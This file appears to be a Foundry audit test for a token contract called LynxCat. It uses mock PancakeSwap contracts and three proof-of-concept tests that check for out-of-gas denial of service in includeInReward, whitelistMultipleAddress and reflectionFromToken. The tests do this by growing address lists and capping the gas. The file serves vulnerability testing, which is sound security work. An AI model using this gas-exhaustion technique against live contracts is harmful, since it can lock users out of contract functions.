// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/LynxCat.sol";

contract MockPair {
    function dummy() external pure {}
}

contract MockWETH {
    function dummy() external pure {}
}

contract MockFactory {
    address public immutable pair;
    constructor(address _pair) {
        pair = _pair;
    }
    function createPair(address, address) external view returns (address) {
        return pair;
    }
}

contract MockRouter {
    address public immutable factory;
    address public immutable WETH_ADDRESS;
    
    constructor(address _factory, address _weth) {
        factory = _factory;
        WETH_ADDRESS = _weth;
    }
    
    function WETH() external view returns (address) {
        return WETH_ADDRESS;
    }
}

contract LynxCatGasTest is Test {
    LynxCat token;
    address owner = address(this);
    uint256 constant EXCESS_ACCOUNTS = 1000;
    uint256 constant lowGas = 100000;
    address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    
    address mockWETH;
    address mockPair;
    address mockFactory;
    address mockRouter;

    function setUp() public {
        // Deploy minimal mock contracts
        mockPair = address(new MockPair());
        mockWETH = address(new MockWETH());
        mockFactory = address(new MockFactory(mockPair));
        mockRouter = address(new MockRouter(mockFactory, mockWETH));
        
        // Patch PancakeSwap router with mock
        vm.etch(PANCAKE_ROUTER, mockRouter.code);
        
        // Deploy token contract
        token = new LynxCat();
    }

    function testIncludeInRewardOOG() public {
        // Create large exclusion list
        for (uint256 i = 0; i < EXCESS_ACCOUNTS; i++) {
            token.excludeFromReward(address(uint160(0x1000 + i)));
        }
        
        console2.log("--- BEFORE Trigger ---");
        console2.log("Gas Limit: %s", lowGas);
        console2.log("Expected Behavior: Revert due to OOG");
        
        console2.log("--- Trigger Call ---");
        (bool success, ) = address(token).call{gas: lowGas}(
            abi.encodeWithSignature("includeInReward(address)", address(0x1000))
        );
        
        console2.log("--- AFTER Trigger ---");
        console2.log("Call reverted: %s", !success ? "YES, Vulnerability Exist" : "NO, Vulnerability not Exist");
        
        // Print final verdict
        if (!success) {
            console2.log("Vulnerability Exists: includeInReward reverted due to out-of-gas condition");
        } else {
            console2.log("Vulnerability not Exist: includeInReward succeeded unexpectedly");
        }
    }

    function testWhitelistAddressOOG() public {
        // Create huge address array
        address[] memory accounts = new address[](EXCESS_ACCOUNTS);
        for (uint256 i = 0; i < EXCESS_ACCOUNTS; i++) {
            accounts[i] = address(uint160(0x2000 + i));
        }
        
        console2.log("--- BEFORE Trigger ---");
        console2.log("Gas Limit: %s", lowGas);
        console2.log("Expected Behavior: Revert due to OOG");
        
        console2.log("--- Trigger Call ---");
        (bool success, ) = address(token).call{gas: lowGas}(
            abi.encodeWithSignature("whitelistMultipleAddress(address[],bool)", accounts, true)
        );
        
        console2.log("--- AFTER Trigger ---");
        console2.log("Call reverted: %s", !success ? "YES, Vulnerability Exist" : "NO, Vulnerability not Exist");
        
        // Print final verdict
        if (!success) {
            console2.log("Vulnerability Exists: whitelistMultipleAddress reverted due to out-of-gas condition");
        } else {
            console2.log("Vulnerability not Exist: whitelistMultipleAddress succeeded unexpectedly");
        }
    }

    function testReflectionSupplyOOG() public {
        // Setup large exclusion list
        for (uint256 i = 0; i < EXCESS_ACCOUNTS; i++) {
            token.excludeFromReward(address(uint160(0x3000 + i)));
        }
        
        console2.log("--- BEFORE Trigger ---");
        console2.log("Gas Limit: %s", lowGas);
        console2.log("Expected Behavior: Revert due to OOG");
        
        console2.log("--- Trigger Call ---");
        (bool success, ) = address(token).staticcall{gas: lowGas}(
            abi.encodeWithSignature("reflectionFromToken(uint256,bool)", 1 ether, true)
        );
        
        console2.log("--- AFTER Trigger ---");
        console2.log("Call reverted: %s", !success ? "YES, Vulnerability Exist" : "NO, Vulnerability not Exist");
        
        // Print final verdict
        if (!success) {
            console2.log("Vulnerability Exists: reflectionFromToken reverted due to out-of-gas condition");
        } else {
            console2.log("Vulnerability not Exist: reflectionFromToken succeeded unexpectedly");
        }
    }
}